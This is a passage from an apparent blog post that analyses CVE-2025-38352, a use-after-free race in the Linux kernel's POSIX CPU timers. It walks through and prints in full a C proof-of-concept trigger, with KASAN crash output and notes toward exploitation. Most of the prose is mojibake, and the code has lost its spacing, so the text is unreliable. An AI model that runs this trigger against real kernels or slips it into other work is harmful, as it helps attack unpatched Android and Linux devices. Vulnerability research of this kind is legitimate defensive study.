åœ¨ timer è§¦å‘å‰æœ‰æ—¶é—´è°ƒç”¨Â exit_notify()  
ï¼Œå¹¶æŠŠ task è½¬æ¢æˆ zombieã€‚  
  
ä½†ä¹Ÿä¸èƒ½å‰©å¤ªå¤š CPU time! å¦åˆ™Â do_exit()  
ä¼šè·‘å®Œå¹¶æ¶ˆè€—å®ƒéœ€è¦çš„ CPU timeï¼Œå¦‚æœ timer è¿˜éœ€è¦åœ¨è¿™ä¹‹åç»§ç»­æ¶ˆè€—æ›´å¤š CPU time æ‰èƒ½è§¦å‘ï¼Œé‚£å®ƒåè€Œä¼šä¸€ç›´è§¦å‘ä¸äº†ã€‚  
  
é€šè¿‡ä¸€äº›è¯•é”™ï¼Œåœ¨æˆ‘çš„æœ¬åœ°ç¯å¢ƒé‡Œï¼ŒæŠŠ CPU time è®¾ç½®ä¸º 250,000 ns æ•ˆæœä¸é”™ã€‚  
  
ä¸‹é¢æˆ‘ä»¬é€æ­¥èµ°ä¸€éæœ€ç»ˆ PoC çš„å…³é”®éƒ¨åˆ† (å®Œæ•´ PoC åœ¨æ–‡æœ«)ã€‚  
### è‡ªå®šä¹‰ç­‰å¾…æ—¶é—´çš„å®ç°  
  
é¦–å…ˆï¼Œæˆ‘é€šè¿‡Â argv[1]  
æä¾›ä¸€ä¸ªè‡ªå®šä¹‰Â wait_time  
ï¼Œæ–¹ä¾¿æµ‹è¯•ã€‚è¿™ä¸ªå€¼è¡¨ç¤º timer è§¦å‘å‰éœ€è¦æ¶ˆè€—çš„ CPU time:  
```
longintÂ wait_time =Â 250000;Â // Works for meintmain(intÂ argc,Â charÂ *argv[]) {// Use a custom wait time to figure out the exact timing when the// timer will fire right after `exit_notify()` sets the task's// state to EXIT_ZOMBIE.ifÂ (argc >Â 1) {Â  Â  Â  Â  wait_time =Â strtol(argv[1],Â NULL,Â 10);printf("Custom wait time:Â %ld\n", wait_time);Â  Â  }
```  
### è®¾ç½® Timer  
  
ç°åœ¨ï¼Œåœ¨ reapee çº¿ç¨‹ä¸­åˆ›å»ºä¸€ä¸ª POSIX CPU timerï¼Œå¹¶æŠŠå®ƒè®¾ç½®ä¸ºåœ¨è‡ªå®šä¹‰Â wait_time  
ä¹‹åè§¦å‘ã€‚  
  
åŒæ—¶è¦æŠŠçº¿ç¨‹åè®¾ç½®ä¸ºÂ SLOWME  
ï¼Œè¿™æ ·å®ƒä¼šå—åˆ°æˆ‘ä»¬åœ¨Â handle_posix_cpu_timers()  
ä¸­åŠ å…¥çš„è‡ªå®šä¹‰Â mdelay()  
patch çš„å½±å“ï¼š  
```
voidreapee(void) {pin_on_cpu(2);structsigeventÂ sev = {0};Â  Â  sev.sigev_notifyÂ = SIGEV_THREAD;Â  Â  sev.sigev_notify_functionÂ = (voidÂ (*)(sigval_t))timer_fire;charÂ m;prctl(PR_SET_NAME,Â "SLOWME");// Send this thread's TID to the parent processpid_tÂ tid = (pid_t)syscall(SYS_gettid);SYSCHK(write(c2p[1], &tid,Â sizeof(pid_t)));printf("Creating timer\n");SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &timer));printf("Timer created\n");structÂ itimerspec ts = {Â  Â  Â  Â  .it_intervalÂ = {0,Â 0},Â  Â  Â  Â  .it_valueÂ = {0, wait_time},Â // Custom wait timeÂ  Â  };// Wait for parent to attachpthread_barrier_wait(&barrier);SYSCHK(timer_settime(timer,Â 0, &ts,Â NULL));// Use some CPU time to make sure the timer will fire correctlyforÂ (intÂ i =Â 0; i <Â 1000000; i++);return;}
```  
### å›æ”¶ Timer çº¿ç¨‹å¹¶åˆ é™¤ Timer  
  
æœ€åï¼Œåœ¨çˆ¶/å­è¿›ç¨‹ä¸­éœ€è¦å®Œæˆä»¥ä¸‹æ“ä½œï¼š  
1. **çˆ¶è¿›ç¨‹**  
â€” åƒä¹‹å‰ä¸€æ ·å›æ”¶ REAPEE çº¿ç¨‹ï¼Œå¹¶ç­‰å¾…å­è¿›ç¨‹é‡Šæ”¾ timerã€‚  
  
1. **å­è¿›ç¨‹**  
â€” ç­‰å¾…çˆ¶è¿›ç¨‹å›æ”¶ REAPEE çº¿ç¨‹ï¼Œç„¶åè°ƒç”¨Â timer_delete()  
åˆ é™¤ timerã€‚  
  
```
intmain(intÂ argc,Â charÂ *argv[]) {// [ ... ]pid_tÂ pid =Â SYSCHK(fork());ifÂ (pid) {// parent// [ ... ]// Signal to child that we attached and continuedSYSCHK(write(p2c[1], &m,Â 1));// Reap the REAPEE thread nowprintf("Parent: reaping REAPEE thread\n");SYSCHK(waitpid(tid,Â NULL, __WALL));printf("Parent: detached from REAPEE\n");// Let the child process know REAPEE is reapedSYSCHK(write(p2c[1], &m,Â 1));// Let the child process delete and free the timer// before exitingSYSCHK(read(c2p[0], &m,Â 1));Â  Â  }Â elseÂ {// child// [ ... ]// Parent process writes to us when attached and continued, use// a barrier to continue the REAPEE thread nowSYSCHK(read(p2c[0], &m,Â 1));pthread_barrier_wait(&barrier);// Parent process writes to us when waitpid() returns successfully.//// At this point, if we won the race, `handle_posix_cpu_timers()` will be in// the patched `mdelay(500)` with `tsk->exit_state != 0`, and calling// `timer_delete()` should make it see a NULL `sighand`, which will cause it to// just free the timer unconditionally.SYSCHK(read(p2c[0], &m,Â 1));timer_delete(timer);printf("Child: timer deleted\n");// Let the timer be freed by RCU, then let the parent process know it can exitwait_for_rcu();SYSCHK(write(c2p[1], &m,Â 1));pause();Â  Â  }}
```  
### æµ‹è¯• PoC  
  
å°±æ˜¯è¿™äº›ï¼è¿è¡Œ PoC çš„æ­¥éª¤å¦‚ä¸‹ï¼š  
1. ç”¨Â gcc -o poc -static poc.c  
ç¼–è¯‘  
  
1. åœ¨ VM ä¸­ç”¨Â while true; do /poc; done  
è¿è¡Œ  
  
æ³¨æ„ PoCÂ å¹¶ä¸æ˜¯  
100% å‘½ä¸­ç«äº‰æ¡ä»¶ï¼Œæ‰€ä»¥æˆ‘ç”¨ bash while å¾ªç¯ä¸€ç›´é‡å¤ç›´åˆ°å‘½ä¸­ã€‚  
  
ä½ åº”å½“å…ˆæŠŠé»˜è®¤çš„Â wait_time  
è°ƒåˆ°é€‚åˆä½ æµ‹è¯•ç¯å¢ƒçš„å€¼ã€‚  
  
ä¸‹é¢çœ‹çœ‹ KASAN å’Œé KASAN çš„ splat é•¿ä»€ä¹ˆæ · ğŸ‘€  
## KASAN æŠ¥é”™ (Splat)  
  
å¼€å¯ KASAN åï¼Œå¯ä»¥è§‚å¯Ÿåˆ°ä¸€æ¬¡ UAF write:  
```
[ Â  Â 9.995817] ==================================================================[ Â  Â 9.999410] BUG: KASAN: slab-use-after-free in posix_timer_queue_signal+0x16a/0x1a0[ Â Â 10.003168] Write of sizeÂ 4Â at addr ffff88800e628188 by task SLOWME/179[ Â Â 10.006386][ Â Â 10.007400] CPU:Â 2Â UID:Â 0Â PID:Â 179Â Comm: SLOWME Not taintedÂ 6.12.33Â #7[ Â Â 10.007406] Hardware name: QEMU StandardÂ PCÂ (i440FX + PIIX,Â 1996), BIOS 1.15.0-1 04/01/2014[ Â  10.007408] Call Trace:[ Â  10.007455] Â <IRQ>[ Â  10.007468] Â dump_stack_lvl+0x66/0x80[ Â  10.007487] Â print_report+0xc1/0x610[ Â  10.007503] Â ? posix_timer_queue_signal+0x16a/0x1a0[ Â  10.007506] Â kasan_report+0xaf/0xe0[ Â  10.007509] Â ? posix_timer_queue_signal+0x16a/0x1a0[ Â  10.007512] Â posix_timer_queue_signal+0x16a/0x1a0[ Â  10.007515] Â cpu_timer_fire+0x8d/0x190[ Â  10.007518] Â run_posix_cpu_timers+0x807/0x1840
```  
## é KASAN æŠ¥é”™ (Splat)  
  
å…³é—­ KASAN åï¼Œå¯ä»¥è§‚å¯Ÿåˆ°Â send_sigqueue()  
å†…éƒ¨çš„ä¸€ä¸ªÂ WARN_ON_ONCE  
:  
```
[ Â Â 29.647984] ------------[ cut here ]------------[ Â Â 29.650267] WARNING: CPU:Â 2Â PID:Â 205Â at kernel/signal.c:1974Â send_sigqueue+0x1be/0x250[ Â Â 29.653905] Modules linked in:[ Â Â 29.655484] CPU:Â 2Â UID:Â 0Â PID:Â 205Â Comm: SLOWME Not taintedÂ 6.12.33Â #5[ Â Â 29.658569] Hardware name: QEMU StandardÂ PCÂ (i440FX + PIIX,Â 1996), BIOS 1.15.0-1 04/01/2014[ Â  29.662579] RIP: 0010:send_sigqueue+0x1be/0x250[ Â  29.664712] Code: 44 89 e0 5b 5d 41 5c 41 5d 41 5e 41 5f e9 d5 e9 94 01 41 bc ff ff ff ff eb e2 48 8b 85 b0 07 00 00 48 8d 50 40 e9 2a ff ff ff <0f> 0b 45 31 e4 eb cb 0f 0b eb c7 4c 89 fe e8 bf 47 6a 01 48 8b bd// [ ... ] Register states snipped out[ Â  29.703210] Call Trace:[ Â  29.704498] Â <IRQ>[ Â  29.705663] Â posix_timer_queue_signal+0x3f/0x50[ Â  29.707869] Â cpu_timer_fire+0x23/0x70[ Â  29.709572] Â run_posix_cpu_timers+0x2bc/0x5e0
```  
## å…³äºÂ CONFIG_POSIX_CPU_TIMERS_TASK_WORKçš„ç®€çŸ­è¡¥å……  
  
@streypaws çš„åšå®¢ (link) æåˆ°å³ä¾¿å¯ç”¨äº†Â CONFIG_POSIX_CPU_TIMERS_TASK_WORK  
ä¹Ÿèƒ½å‘½ä¸­è¿™ä¸ªæ¼æ´ï¼Œä½†æˆ‘æ²¡èƒ½å¤ç°åŒæ ·çš„ç»“æœã€‚  
  
äº‹å®ä¸Šï¼Œåœ¨çœ‹è¿‡Â do_exit()  
ä¸­Â exit_task_work()  
çš„è¡Œä¸ºåï¼Œå°±èƒ½ç†è§£ä¸ºä»€ä¹ˆå¯ç”¨Â CONFIG_POSIX_CPU_TIMERS_TASK_WORK  
æ—¶æ— æ³•è§¦å‘è¯¥æ¼æ´ï¼š  
- exit_task_work()  
ä¼šè°ƒç”¨Â task_work_run()  
ã€‚  
  
- task_work_run()  
ä¼šâ€œæ±¡æŸ“ (poison)â€Â task->task_works  
ç»“æ„ï¼Œé˜»æ­¢åç»­ç»§ç»­å‘å…¶é˜Ÿåˆ—æ–°çš„ workã€‚  
  
ç”±äºè¯¥æ¼æ´è¦æ±‚Â exit_notify()  
åœ¨Â handle_posix_cpu_timers()  
ä¹‹å‰è¢«è°ƒç”¨ï¼Œè€ŒÂ exit_task_work()  
(å¦‚æœè¢«æ’é˜Ÿï¼Œä¼šè°ƒç”¨Â handle_posix_cpu_timers()  
) åœ¨Â exit_notify()  
ä¹‹å‰æ‰§è¡Œï¼Œå› æ­¤å¯ç”¨Â CONFIG_POSIX_CPU_TIMERS_TASK_WORK  
æ—¶æ— æ³•è§¦å‘è¯¥æ¼æ´ã€‚  
## åˆ©ç”¨ (Exploitation)  
  
æˆ‘ä¸ç¡®å®šæ˜¯å¦ä¼šèŠ±æ—¶é—´ä¸ºè¯¥æ¼æ´ç¼–å†™ exploitï¼Œä¸è¿‡æˆ‘è®°ä¸‹äº†ä»¥ä¸‹å‡ ç‚¹ï¼š  
1. POSIX CPU timers ä¼šä»ç‹¬ç«‹çš„Â kmem_cache  
ä¸­åˆ†é…ã€‚  
  
1. struct k_itimer  
ç»“æ„å¹¶ä¸å¤æ‚ï¼Œå› æ­¤å¾ˆå¯èƒ½éœ€è¦ cross-cacheã€‚  
  
1. è¦åš cross-cacheï¼Œhandle_posix_cpu_timers()  
å†…çš„ç«äº‰çª—å£å¯èƒ½éœ€è¦å»¶é•¿ã€‚  
  
1. å»¶é•¿ç«äº‰çª—å£å¯èƒ½ä¼šæ¯”è¾ƒæ£˜æ‰‹ï¼Œå› ä¸ºÂ handle_posix_cpu_timers()  
è¿è¡Œåœ¨ scheduler tick interrupt context ä¸­ï¼Œæ­¤æ—¶ IRQs è¢«ç¦ç”¨ã€‚  
  
æˆ‘çš„ PoC å·²ç»æä¾›äº†ä¸€ä¸ª UAF primitiveï¼›æ˜¾ç„¶ä» Android bulletin çš„æè¿°æ¥çœ‹ï¼Œè¯¥æ¼æ´è‚¯å®šå¯åˆ©ç”¨ã€‚å‰©ä¸‹åªæ˜¯è§£å†³ä¸Šé¢çš„ exploit engineering é—®é¢˜ã€‚  
  
å¦‚æœæˆ‘æœ€ç»ˆæŠ•å…¥æ—¶é—´åšåˆ©ç”¨ï¼Œæˆ‘ä¼šå†å†™ä¸€ç¯‡æ–°åšå®¢ä½œä¸ºæœ¬æ–‡æ›´æ–°ï¼ğŸ˜„  
## ç»“è®º  
  
æ­£å¦‚æˆ‘åœ¨ä»¥å‰çš„åšå®¢é‡Œæåˆ°è¿‡çš„ï¼Œæˆ‘çš„è§‚ç‚¹æ˜¯ï¼šå¯¹å¤æ‚æ¼æ´è¿›è¡Œåˆ†æå¹¶ç¼–å†™ PoCï¼Œæ˜¯å­¦ä¹ ä¸å¼€å±•æ¼æ´ç ”ç©¶çš„æœ€ä½³æ–¹å¼ã€‚  
  
åœ¨è¿™ä¸ªæ¡ˆä¾‹é‡Œï¼Œæˆ‘ä¸ä»…å­¦ä¹ äº† POSIX CPU timersï¼Œè¿˜å­¦ä¹ äº† timer çš„é€šç”¨å·¥ä½œæ–¹å¼ï¼Œä»¥åŠ Linux kernel å¦‚ä½•é€šè¿‡ task structures æè¿°è¿›ç¨‹ä¸çº¿ç¨‹ã€‚  
  
å¦‚æœä½ æœ‰ä»»ä½•é—®é¢˜ï¼Œæ¬¢è¿é€šè¿‡ Twitter æˆ–å…¶å®ƒæ¸ é“è”ç³»æˆ‘ï¼  
## æœ€ç»ˆ PoC  
  
æœ€ç»ˆ PoC å·²ä¸Šä¼ åˆ°æˆ‘çš„ Githubã€‚é“¾æ¥å¦‚ä¸‹ï¼š  
  
https://github.com/farazsth98/poc-CVE-2025-38352  
  
ä¹Ÿåœ¨ä¸‹æ–¹å±•ç¤ºï¼š  
```
#define_GNU_SOURCE#include<time.h>#include<signal.h>#include<stdio.h>#include<unistd.h>#include<pthread.h>#include<sys/ptrace.h>#include<sys/wait.h>#include<sys/types.h>#include<stdlib.h>#include<err.h>#include<sys/prctl.h>#include<sched.h>#include<linux/membarrier.h>#include<sys/syscall.h>#defineSYSCHK(x) ({ Â  Â  Â  Â  Â  Â \typeof(x) __res = (x); Â  Â  Â \ifÂ (__res == (typeof(x))-1) \err(1,Â "SYSCHK("Â #xÂ ")"); \Â  Â  __res; Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â \})voidpin_on_cpu(intÂ i) {cpu_set_tÂ mask;CPU_ZERO(&mask);CPU_SET(i, &mask);sched_setaffinity(0,Â sizeof(mask), &mask);}voidtimer_fire(void) {prctl(PR_SET_NAME,Â "TIMER_FIRED");printf("Timer fired\n");}voidwait_for_rcu() {syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL,Â 0);}pthread_barrier_tÂ barrier;timer_tÂ timer;pthread_tÂ reapee_thread;intÂ c2p[2];Â // child to parentintÂ p2c[2];Â // parent to childlongintÂ wait_time =Â 250000;voidreapee(void) {pin_on_cpu(2);structsigeventÂ sev = {0};Â  Â  sev.sigev_notifyÂ = SIGEV_THREAD;Â  Â  sev.sigev_notify_functionÂ = (voidÂ (*)(sigval_t))timer_fire;charÂ m;prctl(PR_SET_NAME,Â "SLOWME");// Send this thread's TID to the parent processpid_tÂ tid = (pid_t)syscall(SYS_gettid);SYSCHK(write(c2p[1], &tid,Â sizeof(pid_t)));printf("Creating timer\n");SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &timer));printf("Timer created\n");structÂ itimerspec ts = {Â  Â  Â  Â  .it_intervalÂ = {0,Â 0},Â  Â  Â  Â  .it_valueÂ = {Â  Â  Â  Â  Â  Â  .tv_secÂ =Â 0,Â  Â  Â  Â  Â  Â  .tv_nsecÂ = wait_time,Â // Custom wait timeÂ  Â  Â  Â  },Â  Â  };// Wait for parent to attachpthread_barrier_wait(&barrier);SYSCHK(timer_settime(timer,Â 0, &ts,Â NULL));// Use some CPU time to make sure the timer will fire correctlyforÂ (intÂ i =Â 0; i <Â 1000000; i++);return;}intmain(intÂ argc,Â charÂ *argv[]) {// Use a custom wait time to figure out the exact timing when the// timer will fire right after `exit_notify()` sets the task's// state to EXIT_ZOMBIE.ifÂ (argc >Â 1) {Â  Â  Â  Â  wait_time =Â strtol(argv[1],Â NULL,Â 10);printf("Custom wait time:Â %ld\n", wait_time);Â  Â  }// Parent and child setup// Use pipes to communicate between parent and childSYSCHK(pipe(c2p));SYSCHK(pipe(p2c));pid_tÂ pid =Â SYSCHK(fork());ifÂ (pid) {// parentpin_on_cpu(1);charÂ m;close(c2p[1]);close(p2c[0]);// Receive child process's REAPEE thread'sTIDpid_tÂ tid;SYSCHK(read(c2p[0], &tid,Â sizeof(pid_t)));printf("Parent: reapee thread ID:Â %d\n", tid);// Attach and continueprintf("Parent: attaching to REAPEE thread\n");SYSCHK(ptrace(PTRACE_ATTACH, tid,Â NULL,Â NULL));SYSCHK(waitpid(tid,Â NULL, __WALL));SYSCHK(ptrace(PTRACE_CONT, tid,Â NULL,Â NULL));// Signal to child that we attached and continuedSYSCHK(write(p2c[1], &m,Â 1));// Reap the REAPEE thread nowprintf("Parent: reaping REAPEE thread\n");SYSCHK(waitpid(tid,Â NULL, __WALL));printf("Parent: detached from REAPEE\n");// Let the child process know REAPEE is reapedSYSCHK(write(p2c[1], &m,Â 1));// Let the child process delete and free the timer// before exitingSYSCHK(read(c2p[0], &m,Â 1));Â  Â  }Â elseÂ {// childpin_on_cpu(0);charÂ m;close(c2p[0]);close(p2c[1]);prctl(PR_SET_NAME,Â "CHILD_MAIN");pthread_barrier_init(&barrier,Â NULL,Â 2);pthread_create(&reapee_thread,Â NULL, (void*)reapee,Â NULL);printf("Thread created\n");// Parent process writes to us when attached and continued, use// a barrier to continue the REAPEE thread nowSYSCHK(read(p2c[0], &m,Â 1));pthread_barrier_wait(&barrier);// Parent process writes to us when waitpid() returns successfully.//// At this point, if we won the race, `handle_posix_cpu_timers()` will be in// the patched `mdelay(500)` with `tsk->exit_state != 0`, and calling// `timer_delete()` should make it see a NULL `sighand`, which will cause it to// just free the timer unconditionally.SYSCHK(read(p2c[0], &m,Â 1));timer_delete(timer);printf("Child: timer deleted\n");// Let the timer be freed by RCU, then let the parent process know it can exitwait_for_rcu();SYSCHK(write(c2p[1], &m,Â 1));pause();Â  Â  }}
```  
  
---  
> CVE-2025-38352 (Part 1) - In-the-wild Android Kernel Vulnerability Analysis + PoC  
> å…è´£å£°æ˜ï¼šæœ¬åšå®¢æ–‡ç« ä»…ç”¨äºæ•™è‚²å’Œç ”ç©¶ç›®çš„ã€‚æä¾›çš„æ‰€æœ‰æŠ€æœ¯å’Œä»£ç ç¤ºä¾‹æ—¨åœ¨å¸®åŠ©é˜²å¾¡è€…ç†è§£æ”»å‡»æ‰‹æ³•å¹¶æé«˜å®‰å…¨æ€åŠ¿ã€‚è¯·å‹¿ä½¿ç”¨æ­¤ä¿¡æ¯è®¿é—®æˆ–å¹²æ‰°æ‚¨ä¸æ‹¥æœ‰æˆ–æ²¡æœ‰æ˜ç¡®æµ‹è¯•æƒé™çš„ç³»ç»Ÿã€‚æœªç»æˆæƒçš„ä½¿ç”¨å¯èƒ½è¿åæ³•å¾‹å’Œé“å¾·å‡†åˆ™ã€‚ä½œè€…å¯¹å› åº”ç”¨æ‰€è®¨è®ºæ¦‚å¿µè€Œå¯¼è‡´çš„ä»»ä½•è¯¯ç”¨æˆ–æŸå®³ä¸æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚  
  
  
  
